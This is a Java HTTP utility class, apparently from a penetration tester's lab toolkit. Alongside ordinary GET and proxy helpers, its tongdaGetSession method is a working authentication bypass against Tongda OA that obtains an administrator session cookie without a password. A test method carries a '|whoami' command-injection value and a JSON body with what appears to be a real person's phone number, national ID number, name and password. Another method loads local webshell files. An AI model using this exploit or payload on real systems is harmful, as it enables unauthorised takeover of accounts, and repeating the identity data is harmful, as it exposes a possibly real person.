package utils;

import org.apache.http.*;
import org.apache.http.client.config.RequestConfig;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.utils.URIBuilder;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;

import java.io.*;
import java.net.URISyntaxException;
import java.nio.charset.Charset;
import java.util.ArrayList;
import java.util.List;

public class HttpUtils {
    public static String ENCODEGLOABL = "UTF-8";
    public static int TIMEOUT = 5000;

    /**
     * test uri
     * http://testphp.vulnweb.com/
     * @param url
     * @return
     * @throws URISyntaxException
     */
    public static String GetBody(String url) throws URISyntaxException {
        String result = "";
        HttpResponse httpResponse = null;

        CloseableHttpClient httpClient = HttpClients.createDefault();
        HttpGet httpGet = HttpGetConfig(url);
        try{
            httpResponse = httpClient.execute(httpGet);
            HttpEntity httpEntity =  httpResponse.getEntity();
            httpResponse.getAllHeaders();
            result = EntityUtils.toString(httpEntity,"UTF-8");
//            System.out.println(result);
            return result;
        }catch (Exception e){
            e.printStackTrace();
        }
        System.out.println(result);
        return result;
    }


    public static String GetHeaders(String url) throws URISyntaxException {
        String result = "";
        HttpResponse httpResponse = null;

        CloseableHttpClient httpClient = HttpClients.createDefault();

        HttpGet httpGet = HttpGetConfig(url);
        try{
            httpResponse = httpClient.execute(httpGet);
            HttpEntity httpEntity =  httpResponse.getEntity();
            Header[] headers = httpResponse.getAllHeaders();
            for (Header header:headers){
                System.out.println(header.getName());
                System.out.println(header.getValue());
                System.out.println();
            }
            return result;
        }catch (Exception e){
            e.printStackTrace();
        }
        System.out.println(result);
        return result;

    }

    /**
     * 配置httpget内容
     * @param url
     * @return
     * @throws URISyntaxException
     */
    public static HttpGet HttpGetConfig(String url) throws URISyntaxException {
        URIBuilder uriBuilder = new URIBuilder(url);
        uriBuilder.setCharset(Charset.forName("UTF-8"));
//        添加参数
//        List<NameValuePair> urlparameters = new ArrayList<NameValuePair>();
//        urlparameters.add(new BasicNameValuePair("p1","111"));
//        urlparameters.add(new BasicNameValuePair("p2","111"));
//        uriBuilder.addParameters(urlparameters);

        HttpGet httpGet=new HttpGet(uriBuilder.build());
        httpGet.setHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8");
        httpGet.setHeader("Accept-Encoding", "gzip, deflate");
        httpGet.setHeader("Accept-Language", "zh-CN,zh;q=0.8");
        httpGet.setHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36");





        System.out.println(uriBuilder.toString());
        return httpGet;
    }


    public static void ProxyGet(String url) throws IOException, URISyntaxException {
//        代理
        String proxyhost = "10.211.55.2";
        int proxyport = 8080;

        HttpClientBuilder httpClientBuilder = HttpClientBuilder.create();
        CloseableHttpClient httpClient = httpClientBuilder.build();
        HttpHost proxy = new HttpHost(proxyhost,proxyport,"http");
        RequestConfig requestConfig = RequestConfig.custom().setProxy(proxy).build();
//        请求设置
        HttpHost httpHost = new HttpHost(url);
        HttpGet httpGet = HttpGetConfig(url);
        httpGet.setConfig(requestConfig);


//        参数
//        List<NameValuePair> params = new ArrayList<NameValuePair>();
//        params.add(new BasicNameValuePair("p1","111"));
//        params.add(new BasicNameValuePair("p2","222"));
//        params.add(new BasicNameValuePair("p3","333"));


        HttpResponse httpResponse = null;
        System.out.println(httpGet.toString());
        try {
            httpResponse = httpClient.execute(httpGet);
            HttpEntity httpEntity = httpResponse.getEntity();
            String result = EntityUtils.toString(httpEntity,"UTF-8");
            System.out.println(result);
        }catch (Exception e){
            e.printStackTrace();
        }



    }

    /**
     * url为tongda根目录
     * @param url
     * @return
     */
    public static String tongdaGetSession(String url) throws Exception{
        String result = null;
        String codeuid=null;
        CloseableHttpClient httpClient = HttpClients.createDefault();
        boolean useProxy = false;

//        设置代理 host port timeout 返回requestconfig
        String host = "10.211.55.2";
        int port = 8080;
        int timeout = 10000;
        HttpHost proxy = new HttpHost(host,port,"http");
        RequestConfig requestConfig = RequestConfig.custom().setConnectionRequestTimeout(TIMEOUT).build();
        if(useProxy == true){
            requestConfig = RequestConfig.custom().setProxy(proxy).setConnectionRequestTimeout(TIMEOUT).build();
        }



//        第一次请求获取codeuid
        HttpGet httpGet = new HttpGet(url+"/general/login_code.php");
        httpGet.setHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8");
        httpGet.setHeader("Accept-Encoding", "gzip, deflate");
        httpGet.setHeader("Accept-Language", "zh-CN,zh;q=0.8");
        httpGet.setHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36");
        try {
            HttpResponse httpResponse  = httpClient.execute(httpGet);
            if(httpResponse.getStatusLine().getStatusCode() != 200){
                httpClient.close();
                return "Request not equal to 200";
            }
            HttpEntity httpEntity = httpResponse.getEntity();
            String WebContent = EntityUtils.toString(httpEntity);
//            System.out.println(WebContent.toString());
            codeuid = (WebContent.substring(WebContent.lastIndexOf("{"),WebContent.length())).substring(1,37); //获取codeuid
            System.out.println(codeuid);

        }catch (Exception e){
            e.printStackTrace();
            httpClient.close();
            return "Request Failed!";
        }finally {
//            httpClient.close();
        }


//        第二次请求获取cookie
//        配置请求 json 请求头
        HttpPost httpPost = new HttpPost(url + "/logincheck_code.php");
        httpPost.setHeader("Accept", "*/*");
        httpPost.setHeader("Accept-Encoding", "gzip, deflate");
        httpPost.setHeader("Accept-Language", "zh-CN,zh;q=0.8");
        httpPost.setHeader("Content-Type", "application/x-www-form-urlencoded");
        httpPost.setHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36");
        httpPost.setConfig(requestConfig);


        List<NameValuePair> params = new ArrayList<NameValuePair>();
        params.add(new BasicNameValuePair("CODEUID","{"+codeuid+"}"));
        params.add(new BasicNameValuePair("UID","1"));
        UrlEncodedFormEntity urlEncodedFormEntity = new UrlEncodedFormEntity(params);
        httpPost.setEntity(urlEncodedFormEntity);
        try {
            HttpResponse httpResponse = httpClient.execute(httpPost);
            if(httpResponse.getStatusLine().getStatusCode() != 200){return "Request not equal to 200";}
            String webcontent = EntityUtils.toString(httpResponse.getEntity());
            Header[] cookie = httpResponse.getHeaders("Set-Cookie");
            System.out.println(cookie[0].getValue()+webcontent);
            return cookie[0].getValue()+" response-->"+webcontent;
        }catch (Exception e){
            e.printStackTrace();
            return "Second Request Failed";
        }finally {
            httpClient.close();
        }

    }



    public static String test(String url) throws URISyntaxException, UnsupportedEncodingException {
        //代理
        String proxyhost = "10.211.55.2";
        int proxyport = 8080;
        HttpClientBuilder httpClientBuilder = HttpClientBuilder.create();
        CloseableHttpClient httpClient = httpClientBuilder.build();
        HttpHost proxy = new HttpHost(proxyhost,proxyport,"http");
        RequestConfig requestConfig = RequestConfig.custom().setProxy(proxy).setConnectionRequestTimeout(10000).build();
        httpClientBuilder.setDefaultRequestConfig(requestConfig);

        //        参数
        List<NameValuePair> params = new ArrayList<NameValuePair>();
        params.add(new BasicNameValuePair("ipaddress","|whoami"));
        params.add(new BasicNameValuePair("submit","ping"));
        UrlEncodedFormEntity urlEncodedFormEntity = new UrlEncodedFormEntity(params);
        String js = "{\"userName\":\"18600363833\",\"validateChar\":\"706923\",\"randomChar\":\"706923\",\"password\":\"123456\",\"confirmPwd\":\"123456\",\"recommendMobile\":\"\",\"idCard\":\"320601197608285792\",\"realName\":\"阙岩\",\"verifyCode\"}";



        HttpPost httpPost = new HttpPost(url);
//        httpPost.setEntity(urlEncodedFormEntity);
        httpPost.setHeader("Content-Type", "application/json;charset=UTF-8");
        StringEntity se = new StringEntity(js,"UTF-8");
        se.setContentType("application/json");
        httpPost.setEntity(se);
        // 设置代理
        httpPost.setConfig(requestConfig);
        System.out.println(httpPost.toString());

        try {
            HttpEntity httpEntity = httpClient.execute(httpPost).getEntity();
            String result = EntityUtils.toString(httpEntity,"UTF-8");
            System.out.println(result);
            return result;
        }catch (Exception e){
            e.printStackTrace();
        }

        return "None";
    }


    public static String readFile() throws IOException {
//        String TestFile = "src/utils/Resources/shell.php";
        String TestFile = "src/utils/Resources/shell_unicode.php";
        System.out.println(System.getProperty("user.dir"));
        BufferedReader bufferedReader = new BufferedReader(new FileReader(TestFile));
        StringBuilder stringBuilder = new StringBuilder();
        String line = null;
        String ls = System.getProperty("line.separator");
        while ((line = bufferedReader.readLine()) != null){
            stringBuilder.append(line);
            stringBuilder.append(ls);
        }
        bufferedReader.close();
        System.out.println(stringBuilder.toString());
        


        return "";
    }



    public static void main(String[] args) throws Exception{
        String baidu = "https://www.baidu.com/";
        String vulnweb = "http://testphp.vulnweb.com/";
        String my = "http://10.211.55.7/vuln/pikachu/vul/rce/rce_ping.php";
//        GetBody(baidu);
//        GetHeaders(baidu);
//        test(my);
//        tongdaGetSession("http://10.211.55.7/");
//        String html = GetBody("http://10.211.55.7/inc/expired.php");
//        Document document = Jsoup.parse(html);
//        String text = document.body().text();
//        Elements content = document.select("body > table > tbody > tr:nth-child(1) > td > span");
//        System.out.println(content);
//        System.out.println(text);
//        GetBody("http://10.211.55.7/resque/worker.php");
//        String body = GetBody("https://blog.csdn.net/irokay/article/details/78801307");
//        System.out.println(body);
        readFile();


    }

}
